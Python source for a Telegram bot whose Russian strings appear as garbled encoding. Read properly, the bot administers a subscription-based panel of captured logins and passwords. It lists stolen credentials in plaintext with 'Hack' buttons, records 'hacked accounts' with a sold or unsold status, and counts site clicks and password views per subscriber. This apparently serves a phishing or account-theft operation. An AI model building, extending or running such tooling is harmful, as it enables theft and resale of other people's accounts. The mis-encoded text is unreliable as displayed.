    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /passwords –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.reply_to(message, access)
        return
    increment_password_views(chat_id)
    credentials = get_credentials()
    if not credentials:
        bot.reply_to(message, "üìÇ –°–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π –ø—É—Å—Ç.")
        return
    response = "üîë –°–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π:\n"
    markup = types.InlineKeyboardMarkup()
    for login, password, added_time in credentials:
        formatted_time = format_time_with_minutes(added_time)
        response += f"–õ–æ–≥–∏–Ω: {login} | –ü–∞—Ä–æ–ª—å: {password} | –î–æ–±–∞–≤–ª–µ–Ω: {formatted_time}\n"
        markup.add(
            types.InlineKeyboardButton(f"–£–¥–∞–ª–∏—Ç—å {login}", callback_data=f"delete_cred_{login}"),
            types.InlineKeyboardButton(f"–í–∑–ª–æ–º–∞—Ç—å {login}", callback_data=f"hack_cred_{login}")
        )
    bot.reply_to(message, response, reply_markup=markup)

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /hacked –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        bot.reply_to(message, access)
        return
    hacked_accounts = get_hacked_accounts()
    if not hacked_accounts:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–î–æ–±–∞–≤–∏—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç", callback_data="add_hacked"))
        bot.reply_to(message, "üìÇ –°–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –ø—É—Å—Ç.", reply_markup=markup)
        return
    response = "üîì –í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã:\n"
    markup = types.InlineKeyboardMarkup()
    for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
        formatted_time = format_time_with_minutes(hack_date)
        response += (f"–õ–æ–≥–∏–Ω: {login} | –ü–∞—Ä–æ–ª—å: {password} | –î–∞—Ç–∞: {formatted_time} | "
                     f"–ü—Ä–µ—Ñ–∏–∫—Å: {prefix} | –°—Ç–∞—Ç—É—Å: {sold_status} | Chat ID: {linked_chat_id}\n")
        markup.add(
            types.InlineKeyboardButton(f"–£–¥–∞–ª–∏—Ç—å {login}", callback_data=f"delete_hacked_{login}")
        )
    markup.add(types.InlineKeyboardButton("–î–æ–±–∞–≤–∏—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç", callback_data="add_hacked"))
    bot.reply_to(message, response, reply_markup=markup)

@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /database –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    
    response = "üìä –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö:\n\n"
    
    # –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏
    users = get_all_users()
    response += "üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏:\n"
    if not users:
        response += "–ü—É—Å—Ç–æ\n"
    else:
        for chat_id, prefix, subscription_end, site_clicks, password_views in users:
            time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
            response += f"Chat ID: {chat_id} | –ü—Ä–µ—Ñ–∏–∫—Å: {prefix} | –ü–æ–¥–ø–∏—Å–∫–∞: {time_left} –¥–Ω–µ–π\n"
    
    # –ü–∞—Ä–æ–ª–∏
    credentials = get_credentials()
    response += "\nüîë –ü–∞—Ä–æ–ª–∏:\n"
    if not credentials:
        response += "–ü—É—Å—Ç–æ\n"
    else:
        for login, password, added_time in credentials:
            formatted_time = format_time_with_minutes(added_time)
            response += f"–õ–æ–≥–∏–Ω: {login} | –ü–∞—Ä–æ–ª—å: {password} | –î–æ–±–∞–≤–ª–µ–Ω: {formatted_time}\n"
    
    # –í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã
    hacked_accounts = get_hacked_accounts()
    response += "\nüîì –í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã:\n"
    if not hacked_accounts:
        response += "–ü—É—Å—Ç–æ\n"
    else:
        for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
            formatted_time = format_time_with_minutes(hack_date)
            response += f"–õ–æ–≥–∏–Ω: {login} | –ü–∞—Ä–æ–ª—å: {password} | –î–∞—Ç–∞: {formatted_time} | –°—Ç–∞—Ç—É—Å: {sold_status}\n"

    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("–î–æ–±–∞–≤–∏—Ç—å", callback_data="db_add"),
        types.InlineKeyboardButton("–£–¥–∞–ª–∏—Ç—å", callback_data="db_delete"),
        types.InlineKeyboardButton("–ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å", callback_data="db_view")
    )
    bot.reply_to(message, response, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("db_"))
def handle_db_callback(call):
    chat_id = str(call.message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ callback –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö –¥–ª—è chat_id: {chat_id}, data: {call.data}")
    
    if call.data == "db_add":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("–î–æ–±–∞–≤–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", callback_data="db_add_user"),
            types.InlineKeyboardButton("–î–æ–±–∞–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å", callback_data="db_add_cred"),
            types.InlineKeyboardButton("–î–æ–±–∞–≤–∏—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π", callback_data="db_add_hacked")
        )
        bot.edit_message_text("üìä –í—ã–±–µ—Ä–∏—Ç–µ, —á—Ç–æ –¥–æ–±–∞–≤–∏—Ç—å:", chat_id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "db_delete":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("–£–¥–∞–ª–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", callback_data="db_del_user"),
            types.InlineKeyboardButton("–£–¥–∞–ª–∏—Ç—å –ø–∞—Ä–æ–ª—å", callback_data="db_del_cred"),
            types.InlineKeyboardButton("–£–¥–∞–ª–∏—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π", callback_data="db_del_hacked")
        )
        bot.edit_message_text("üìä –í—ã–±–µ—Ä–∏—Ç–µ, —á—Ç–æ —É–¥–∞–ª–∏—Ç—å:", chat_id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "db_view":
        bot.edit_message_text("üìä –í—ã —É–∂–µ –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞–µ—Ç–µ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö!", chat_id, call.message.message_id)
    
    # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ
    elif call.data == "db_add_user":
        bot.edit_message_text("üìù –í–≤–µ–¥–∏—Ç–µ: /adduser <chat_id> <–ø—Ä–µ—Ñ–∏–∫—Å> <–¥–Ω–∏>", chat_id, call.message.message_id)
    elif call.data == "db_add_cred":
        bot.edit_message_text("üìù –í–≤–µ–¥–∏—Ç–µ: /addcred <–ª–æ–≥–∏–Ω> <–ø–∞—Ä–æ–ª—å>", chat_id, call.message.message_id)
    elif call.data == "db_add_hacked":
        bot.edit_message_text("üìù –í–≤–µ–¥–∏—Ç–µ: /addhacked <–ª–æ–≥–∏–Ω> <–ø–∞—Ä–æ–ª—å>", chat_id, call.message.message_id)
    
    # –£–¥–∞–ª–µ–Ω–∏–µ
    elif call.data == "db_del_user":
        users = get_all_users()
        if not users:
            bot.edit_message_text("üìÇ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –Ω–µ—Ç.", chat_id, call.message.message_id)
        else:
            markup = types.InlineKeyboardMarkup()
            for chat_id_user, prefix, _, _, _ in users:
                markup.add(types.InlineKeyboardButton(f"{chat_id_user} ({prefix})", callback_data=f"db_del_user_{chat_id_user}"))
            bot.edit_message_text("üìä –í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è:", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data == "db_del_cred":
        credentials = get_credentials()
        if not credentials:
            bot.edit_message_text("üìÇ –ü–∞—Ä–æ–ª–µ–π –Ω–µ—Ç.", chat_id, call.message.message_id)
        else:
            markup = types.InlineKeyboardMarkup()
            for login, _, _ in credentials:
                markup.add(types.InlineKeyboardButton(f"{login}", callback_data=f"db_del_cred_{login}"))
            bot.edit_message_text("üìä –í—ã–±–µ—Ä–∏—Ç–µ –ø–∞—Ä–æ–ª—å –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è:", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data == "db_del_hacked":
        hacked_accounts = get_hacked_accounts()
        if not hacked_accounts:
            bot.edit_message_text("üìÇ –í–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –Ω–µ—Ç.", chat_id, call.message.message_id)
        else:
            markup = types.InlineKeyboardMarkup()
            for login, _, _, _, _, _ in hacked_accounts:
                markup.add(types.InlineKeyboardButton(f"{login}", callback_data=f"db_del_hacked_{login}"))
            bot.edit_message_text("üìä –í—ã–±–µ—Ä–∏—Ç–µ –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è:", chat_id, call.message.message_id, reply_markup=markup)
    
    # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–∏—è
    elif call.data.startswith("db_del_user_"):
        chat_id_user = call.data[len("db_del_user_"):]
        if delete_user(chat_id_user):
            bot.edit_message_text(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id_user} —É–¥–∞–ª–µ–Ω.", chat_id, call.message.message_id)
        else:
            bot.edit_message_text("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏.", chat_id, call.message.message_id)
    elif call.data.startswith("db_del_cred_"):
        login = call.data[len("db_del_cred_"):]
        if delete_credentials(login):
            bot.edit_message_text(f"‚úÖ –õ–æ–≥–∏–Ω {login} —É–¥–∞–ª–µ–Ω.", chat_id, call.message.message_id)
        else:
            bot.edit_message_text("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏.", chat_id, call.message.message_id)
    elif call.data.startswith("db_del_hacked_"):
        login = call.data[len("db_del_hacked_"):]
        if delete_hacked_account(login):
            bot.edit_message_text(f"‚úÖ –õ–æ–≥–∏–Ω {login} —É–¥–∞–ª–µ–Ω –∏–∑ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö.", chat_id, call.message.message_id)
        else:
            bot.edit_message_text("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏.", chat_id, call.message.message_id)

@bot.message_handler(commands=['adduser'])
def add_user_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /adduser –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 3 or not args[2].isdigit():
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /adduser <chat_id> <–ø—Ä–µ—Ñ–∏–∫—Å> <–¥–Ω–∏>")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    subscription_end = get_current_time() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    bot.reply_to(message, f"‚úÖ –î–æ–±–∞–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {target_chat_id} —Å –ø—Ä–µ—Ñ–∏–∫—Å–æ–º {prefix} –Ω–∞ {days} –¥–Ω–µ–π.")

@bot.message_handler(commands=['addcred'])
def add_cred_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /addcred –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 2:
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /addcred <–ª–æ–≥–∏–Ω> <–ø–∞—Ä–æ–ª—å>")
        return
    login, password = args[0], args[1]
    if save_credentials(login, password):
        bot.reply_to(message, f"‚úÖ –î–æ–±–∞–≤–ª–µ–Ω –ª–æ–≥–∏–Ω {login} —Å –ø–∞—Ä–æ–ª–µ–º {password}.")
    else:
        bot.reply_to(message, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏.")

@bot.message_handler(commands=['addhacked'])
def add_hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /addhacked –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 2:
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /addhacked <–ª–æ–≥–∏–Ω> <–ø–∞—Ä–æ–ª—å>")
        return
    login, password = args[0], args[1]
    user = get_user(chat_id)
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("–ü—Ä–æ–¥–∞–Ω", callback_data=f"hack_{login}_{password}_–ü—Ä–æ–¥–∞–Ω_{chat_id}"),
        types.InlineKeyboardButton("–ù–µ –ø—Ä–æ–¥–∞–Ω", callback_data=f"hack_{login}_{password}_–ù–µ –ø—Ä–æ–¥–∞–Ω_{chat_id}")
    )
    bot.reply_to(message, f"üîì –£–∫–∞–∂–∏—Ç–µ —Å—Ç–∞—Ç—É—Å –¥–ª—è {login}:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("hack_"))
def handle_hack_callback(call):
    chat_id = str(call.message.chat.id)
    parts = call.data.split("_")
    login, password, sold_status, linked_chat_id = parts[1], parts[2], parts[3], parts[4]
    user = get_user(chat_id)
    if save_hacked_account(login, password, user['prefix'], sold_status, linked_chat_id):
        bot.edit_message_text(f"‚úÖ {login} –¥–æ–±–∞–≤–ª–µ–Ω –≤ –≤–∑–ª–æ–º–∞–Ω–Ω—ã–µ —Å–æ —Å—Ç–∞—Ç—É—Å–æ–º {sold_status}.", 
                             chat_id, call.message.message_id)
        bot.answer_callback_query(call.id)
    else:
        bot.answer_callback_query(call.id, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_"))
def handle_delete_callback(call):
    chat_id = str(call.message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ callback –¥–ª—è chat_id: {chat_id}, data: {call.data}")
    
    if call.data.startswith("delete_cred_"):
        login = call.data[len("delete_cred_"):]
        if delete_credentials(login):
            bot.edit_message_text(f"‚úÖ –õ–æ–≥–∏–Ω {login} —É–¥–∞–ª–µ–Ω –∏–∑ —Å–ø–∏—Å–∫–∞ –ø–∞—Ä–æ–ª–µ–π.", 
                                 chat_id, call.message.message_id)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏.")
    
    elif call.data.startswith("delete_hacked_"):
        login = call.data[len("delete_hacked_"):]
        if delete_hacked_account(login):
            bot.edit_message_text(f"‚úÖ –õ–æ–≥–∏–Ω {login} —É–¥–∞–ª–µ–Ω –∏–∑ —Å–ø–∏—Å–∫–∞ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö.", 
                                 chat_id, call.message.message_id)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏.")

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /admin –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        bot.reply_to(message, access)
        return
    users = get_all_users()
    if not users:
        bot.reply_to(message, "üìÇ –°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø—É—Å—Ç.")
        return
    response = "üëë –ü–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞\n–°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:\n"
    for chat_id, prefix, subscription_end, site_clicks, password_views in users:
        time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
        response += (f"Chat ID: {chat_id}\n"
                     f"–ü—Ä–µ—Ñ–∏–∫—Å: {prefix}\n"
                     f"–ü–æ–¥–ø–∏—Å–∫–∞: {time_left} –¥–Ω–µ–π\n"
                     f"–ö–ª–∏–∫–æ–≤ –Ω–∞ —Å–∞–π—Ç: {site_clicks if site_clicks else 0}\n"
                     f"–ü—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ –ø–∞—Ä–æ–ª–µ–π: {password_views if password_views else 0}\n\n")
    bot.reply_to(message, response)

@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /adprefix –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) < 3 or not args[2].isdigit():
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /adprefix <chat_id> <–ø—Ä–µ—Ñ–∏–∫—Å> <–¥–Ω–∏>\n–ü—Ä–µ—Ñ–∏–∫—Å—ã: –ê–¥–º–∏–Ω, –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    if prefix not in ["–ê–¥–º–∏–Ω", "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"]:
        bot.reply_to(message, "‚ùå –ü—Ä–µ—Ñ–∏–∫—Å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å: –ê–¥–º–∏–Ω –∏–ª–∏ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å")
        return
    subscription_end = get_current_time() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    bot.reply_to(message, f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {target_chat_id} –≤—ã–¥–∞–Ω –ø—Ä–µ—Ñ–∏–∫—Å {prefix} –Ω–∞ {days} –¥–Ω–µ–π.")

@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /delprefix –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args:
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /delprefix <chat_id>")
        return
    target_chat_id = args[0]
    save_user(target_chat_id, "–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å", get_current_time())
    bot.reply_to(message, f"‚úÖ –ü—Ä–µ—Ñ–∏–∫—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {target_chat_id} —Å–±—Ä–æ—à–µ–Ω –¥–æ –ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å.")

init_db()  # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ

if __name__ == "__main__":
    threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
